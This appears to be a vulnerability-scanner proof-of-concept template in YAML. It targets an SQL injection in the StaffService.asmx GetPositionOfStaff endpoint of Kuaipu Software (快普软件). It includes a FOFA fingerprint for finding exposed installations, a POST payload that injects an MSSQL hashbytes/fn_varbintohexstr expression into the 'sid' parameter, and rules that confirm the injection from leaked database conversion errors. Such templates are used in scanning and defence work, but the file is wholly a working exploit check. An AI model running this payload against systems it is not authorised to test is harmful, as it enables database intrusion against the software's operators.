id: poc-yaml-kuaipu-staffservice-asmx-sqli
info:
  name: 快普软件 StaffService.asmx SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 快普软件
  fofa: body="Resource/JavaScript/jKPM6.DateTime.js"
variables:
  t1: random_int(1000,10000)
  t2: md5(t1)
requests:
- method: GET
  path: /
  expression: status_code == 200 && contains(body,"Resource/JavaScript/jKPM6.DateTime.js")
- method: POST
  path: /WebService/StaffService.asmx/GetPositionOfStaff
  headers:
    Content-Type: application/x-www-form-urlencoded
  data: sid=sys.fn_varbintohexstr(hashbytes('MD5','{{.t1}}'))
  expression: 'status_code == 500 &&

    contains(body,"0x" + t2) &&

    matches(body,"转换成数据类型(.*?)时失败") &&

    matches(body,"在将(.*?)值")

    '
transport: http
